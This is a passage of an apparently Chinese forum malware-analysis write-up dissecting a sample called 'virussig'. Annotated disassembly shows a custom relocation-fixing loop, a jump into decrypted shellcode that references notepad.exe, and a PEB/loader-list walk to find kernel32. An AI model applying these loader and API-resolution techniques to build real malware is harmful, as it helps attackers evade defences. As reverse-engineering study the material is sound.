
第二个字符串的地址为:`0x3F031C`

第三个字符串的地址为:`0x3F0330`

。。。。。。

![](https://bbs.kanxue.com/upload/attach/201205/372322_qugaw2hn229nrb3.png)

`0x3F05F8`:`0x400308`

`0x3F05FC`:`0x40031C`

`0x3F0600`:`0x400330`

。。。。。。

单独列出来的数据中，我们把第二堆数据的`0x40`换成`0x3F`就是第一堆数据的结果。

这应该是存在一个偏移值。还记得是第三个参数吗:

第二次申请的内存区域的首地址减去exe的基地址`0x400000`

换成数值的话应该就是`0x3F0000-0x400000`，这就是这个偏移值啊

函数当中就是把第三个参数用作这个修正偏移值，而第二个参数显然就是需要修正的内存区域值。第一个参数？

我们想一下，要想修正这个区域，我们还需要一个东西，那就是那些指针的地址。也就是上面第二个图下面的:`0x3F05F8`，`0x3F05FC`，`0x3F0600`等数据。

第一个参数是`0x8F0000`：

![](https://bbs.kanxue.com/upload/attach/201205/372322_2l7303qe2zm5ynm.png)

我们看到一些数据:

`0x35F8,0x35FC,0x3600,0x3604,0x3608` 。。。。。。

将其与`0xFFF`相与，则为:

`0x5F8,0x5FC,0x600,0x604,0x608` 。。。。。。

这些值加上`0x3F0000`就得到指针地址了。

主要算法这就样了，有些细节，比如:如何确定个数 下面仔细看看:

```asm
00401496  |> /8B45 08       /MOV EAX,DWORD PTR SS:[EBP+8]            ;  第一个参数0x8F0000
00401499  |. |8378 04 00    |CMP DWORD PTR DS:[EAX+4],0              ;  0x8F0000的第二个DWORD区域的值，应该是表示着剩下需要处理的个数
0040149D  |. |0F84 9D000000 |JE virussig.00401540
004014A3  |. |C745 EC 889B0>|MOV DWORD PTR SS:[EBP-14],39B88
004014AA  |. |8B4D 08       |MOV ECX,DWORD PTR SS:[EBP+8]
004014AD  |. |8B51 04       |MOV EDX,DWORD PTR DS:[ECX+4]            ;  获取0x8F0000的第二个DWORD区域的值
004014B0  |. |83EA 08       |SUB EDX,8
004014B3  |. |D1EA          |SHR EDX,1
004014B5  |. |8955 F4       |MOV DWORD PTR SS:[EBP-C],EDX            ;  x=(x-8)>>1
004014B8  |. |8B45 08       |MOV EAX,DWORD PTR SS:[EBP+8]
004014BB  |. |83C0 08       |ADD EAX,8
004014BE  |. |8945 F0       |MOV DWORD PTR SS:[EBP-10],EAX
004014C1  |. |C745 FC 00000>|MOV DWORD PTR SS:[EBP-4],0              ;  计数之用
004014C8  |. |EB 09         |JMP SHORT virussig.004014D3
004014CA  |> |8B4D FC       |/MOV ECX,DWORD PTR SS:[EBP-4]
004014CD  |. |83C1 01       ||ADD ECX,1
004014D0  |. |894D FC       ||MOV DWORD PTR SS:[EBP-4],ECX
004014D3  |> |8B55 FC       | MOV EDX,DWORD PTR SS:[EBP-4]
004014D6  |. |3B55 F4       ||CMP EDX,DWORD PTR SS:[EBP-C]
004014D9  |. |73 54         ||JNB SHORT virussig.0040152F            ;  判断是否处理完毕
004014DB  |. |C745 E8 889B0>||MOV DWORD PTR SS:[EBP-18],39B88
004014E2  |. |8B45 FC       ||MOV EAX,DWORD PTR SS:[EBP-4]           ;  将要修正的数据在数组中的索引
004014E5  |. |8B4D F0       ||MOV ECX,DWORD PTR SS:[EBP-10]
004014E8  |. |0FB71441      ||MOVZX EDX,WORD PTR DS:[ECX+EAX*2]      ;  获取0x35F8之类的值
004014EC  |. |C1FA 0C       ||SAR EDX,0C
004014EF  |. |83FA 03       ||CMP EDX,3
004014F2  |. |75 39         ||JNZ SHORT virussig.0040152D            ;  判断WORD的高两位为是否为3
004014F4  |. |C745 E4 889B0>||MOV DWORD PTR SS:[EBP-1C],39B88
004014FB  |. |8B45 FC       ||MOV EAX,DWORD PTR SS:[EBP-4]
004014FE  |. |8B4D F0       ||MOV ECX,DWORD PTR SS:[EBP-10]
00401501  |. |0FB71441      ||MOVZX EDX,WORD PTR DS:[ECX+EAX*2]
00401505  |. |81E2 FF0F0000 ||AND EDX,0FFF                           ;  与0xFFF相与
0040150B  |. |8955 F8       ||MOV DWORD PTR SS:[EBP-8],EDX
0040150E  |. |8B45 08       ||MOV EAX,DWORD PTR SS:[EBP+8]
00401511  |. |8B4D 0C       ||MOV ECX,DWORD PTR SS:[EBP+C]
00401514  |. |0308          ||ADD ECX,DWORD PTR DS:[EAX]             ;  0x8F0000区域的第一个DWORD数据
00401516  |. |8B55 F8       ||MOV EDX,DWORD PTR SS:[EBP-8]
00401519  |. |8B0411        ||MOV EAX,DWORD PTR DS:[ECX+EDX]         ;  得到的地址偏移加上基地址，得到需要修正的指针地址
0040151C  |. |0345 10       ||ADD EAX,DWORD PTR SS:[EBP+10]          ;  处理一下存在的偏移问题
0040151F  |. |8B4D 08       ||MOV ECX,DWORD PTR SS:[EBP+8]
00401522  |. |8B55 0C       ||MOV EDX,DWORD PTR SS:[EBP+C]
00401525  |. |0311          ||ADD EDX,DWORD PTR DS:[ECX]
00401527  |. |8B4D F8       ||MOV ECX,DWORD PTR SS:[EBP-8]
0040152A  |. |89040A        ||MOV DWORD PTR DS:[EDX+ECX],EAX         ;  修正最后的结果
0040152D  |>^|EB 9B         |\JMP SHORT virussig.004014CA
0040152F  |> |8B55 08       |MOV EDX,DWORD PTR SS:[EBP+8]
00401532  |. |8B45 08       |MOV EAX,DWORD PTR SS:[EBP+8]
00401535  |. |0342 04       |ADD EAX,DWORD PTR DS:[EDX+4]
00401538  |. |8945 08       |MOV DWORD PTR SS:[EBP+8],EAX            ;  下一个需要处理的数据结构
0040153B  |.^\E9 56FFFFFF   \JMP virussig.00401496
```

结果仔细一看，除了修正了字符串地址指针数组外，还进行了一个修复。同时它们采用的是相同的数据结构:

![](https://bbs.kanxue.com/upload/attach/201205/372322_hjmmdsbxbqyhuts.png)

阴影部分我们称为数据块1

![](https://bbs.kanxue.com/upload/attach/201205/372322_35kg89l9sjyx65f.png)

阴影部分我们称为数据块2

我们可以这样定义这个数据结构:

基地址'`RVA`'(`DWORD`) + 数据块的内存大小(`DWORD`) + 需要修正的地址的`RVA`数组(`WORD`*个数)

地地址`RVA`:比如`0x0`和`0x1000`，加上需要修正的内存数据块的基地址`0x3F0000`，那么我们分别得到`0x3F0000`,`0x3F1000`.

我们可以通过数据块的内存大小得到需要修正的个数:

`num = (Size-8) / 2` :减去前8个字节，然后除以2(每个`RVA`占`WORD`大小)

这里有一个疑问，第一次的修复可以理解为类似于IAT的修复。那么第二次的修复主要起什么作用啦？留一个悬念，后面在来揭晓。

修复完毕之后我们看到:

```asm
mov     ecx, [ebp+var\_4]
add     ecx, 10F0h      ; 入口点的偏移
push    0
jmp     ecx             ; 这里！！！
```

最后ecx为`0x3F10F0`.

这块区域是之前申请的，拥有执行权限，看来进过将其数据的解密和修复，里面存放了一些的"代码"啊，我们跟进去看吧。

### 4.执行`shellcode`

```asm
003F10F0    55              PUSH EBP
003F10F1    8BEC            MOV EBP,ESP
003F10F3    E8 98F9FFFF     CALL 003F0A90
003F10F8    C605 60193F00 0>MOV BYTE PTR DS:[3F1960],0
003F10FF    6A 20           PUSH 20
003F1101    68 40193F00     PUSH 3F1940
003F1106    E8 65F7FFFF     CALL 003F0870
003F110B    83C4 08         ADD ESP,8
003F110E    68 04010000     PUSH 104
003F1113    68 50173F00     PUSH 3F1750
003F1118    6A 00           PUSH 0
003F111A    FF15 58183F00   CALL DWORD PTR DS:[3F1858]
003F1120    E8 CBFCFFFF     CALL 003F0DF0
003F1125    68 74073F00     PUSH 3F0774    ; ASCII "notepad.exe"
003F112A    E8 31FEFFFF     CALL 003F0F60
003F112F    83C4 04         ADD ESP,4
003F1132    85C0            TEST EAX,EAX
003F1134    75 0A           JNZ SHORT 003F1140
003F1136    6A 01           PUSH 1
003F1138    E8 13000000     CALL 003F1150
003F113D    83C4 04         ADD ESP,4
003F1140    6A 00           PUSH 0
003F1142    FF15 DC183F00   CALL DWORD PTR DS:[3F18DC]
003F1148    33C0            XOR EAX,EAX
003F114A    5D              POP EBP
003F114B    C3              RETN
```

从总体上看，主要用红色标注的几处有函数调用，我们详细分析它们，并且出现了`notepad.exe`，看来要对记事本做一些手脚.

`Sub_3F0A90`,这个函数主要是通过一些列的API字符串，找到其相应的地址。

应该说也没有什么难点，不过作者是通过`TEB`获取`kernel32`等模块地址的，这个着实头痛了一番。:

```asm
003F09A0    55              PUSH EBP
003F09A1    8BEC            MOV EBP,ESP
003F09A3    51              PUSH ECX
003F09A4    56              PUSH ESI
003F09A5    57              PUSH EDI
003F09A6    33C9            XOR ECX,ECX
003F09A8    64:8B71 30      MOV ESI,DWORD PTR FS:[ECX+30]
003F09AC    8B76 0C         MOV ESI,DWORD PTR DS:[ESI+C]
003F09AF    8B76 1C         MOV ESI,DWORD PTR DS:[ESI+1C]
003F09B2    8B46 08         MOV EAX,DWORD PTR DS:[ESI+8]
003F09B5    8945 FC         MOV DWORD PTR SS:[EBP-4],EAX
003F09B8    8B7E 20         MOV EDI,DWORD PTR DS:[ESI+20]
003F09BB    8B36            MOV ESI,DWORD PTR DS:[ESI]
003F09BD    803F 6B         CMP BYTE PTR DS:[EDI],6B                 ; k
003F09C0    74 07           JE SHORT 003F09C9
003F09C2    803F 4B         CMP BYTE PTR DS:[EDI],4B                 ; K
003F09C5    74 02           JE SHORT 003F09C9
003F09C7  ^ EB E9           JMP SHORT 003F09B2
003F09C9    5F              POP EDI
003F09CA    5E              POP ESI
003F09CB    8BE5            MOV ESP,EBP
003F09CD    5D              POP EBP
003F09CE    C3              RETN
```

这个函数没有参数，从效果上说不需要理解细节只通过返回值来看都晓得它是获取`kernel32`的地址。不过我们还是来仔细看看:

`fs:[0]`为`TEB`，`TEB`偏移`0x30`为`PEB` 这是之前了解的。应为没有学过驱动，后面的差了些资料才好理解。`PEB`偏移`0x1C`处是

```c
+0x00c Ldr              : Ptr32 _PEB_LDR_DATA

typedef struct _PEB_LDR_DATA {

ULONG Length;                            //+0x000

BOOLEAN Initialized;                       //+0x004

PVOID SsHandle;                           //+0x008

LIST_ENTRY InLoadOrderModuleList;          //+0x00C

LIST_ENTRY InMemoryOrderModuleList;       //+0x014

LIST_ENTRY InInitializationOrderModuleList;    //+0x1C

} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

在`PEB_LDR_DATA`偏移`0x1C`处是`InInitializationOrderModuleList`。

```c
typedef struct _LDR_MODULE

{

    LIST_ENTRY        InLoadOrderModuleList;            // +0x000

    LIST_ENTRY        InMemoryOrderModuleList;          // +0x008
```
